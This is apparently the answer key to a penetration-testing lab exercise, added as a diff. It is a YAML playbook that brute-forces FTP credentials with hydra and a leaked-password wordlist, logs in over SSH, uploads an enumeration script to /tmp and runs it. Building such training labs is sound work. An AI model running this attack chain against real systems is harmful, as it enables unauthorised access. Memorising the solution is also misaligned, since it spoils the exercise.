@@ -1,0 +1,60 @@
+#
+# Exercise 3: Solution
+#
+
+vars:
+  TARGET: 172.17.0.106
+  PASSWDLIST: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
+
+commands:
+  # PHASE 1: Credential Discovery
+
+  # TODO 1
+  - type: shell
+    cmd: hydra -l user -P $PASSWDLIST $TARGET ftp
+
+  # TODO 2
+  - type: regex
+    cmd: ".*login: user.+password: (.+)"
+    output:
+      PASSWORD: "$MATCH_0"
+
+  # TODO 3
+  - type: debug
+    cmd: "Discovered password: $PASSWORD"
+
+  # PHASE 2: SSH Access
+
+  # TODO 4
+  - type: ssh
+    cmd: id
+    username: user
+    password: "$PASSWORD"
+    hostname: $TARGET
+    creates_session: "foothold"
+
+  # TODO 5
+  - type: ssh
+    cmd: uname -a
+    session: "foothold"
+
+  # TODO 6
+  - type: debug
+    cmd: "Target OS: $RESULT_STDOUT"
+
+  # PHASE 3: File Transfer
+
+  # TODO 7
+  - type: sftp
+    cmd: put
+    local_path: exercises/enum.sh
+    remote_path: /tmp/enum.sh
+    session: "foothold"
+    mode: "755"
+
+  # TODO 8
+  - type: ssh
+    cmd: "bash /tmp/enum.sh\n"
+    session: "foothold"
+    interactive: True
+    save: /tmp/enum_results.txt
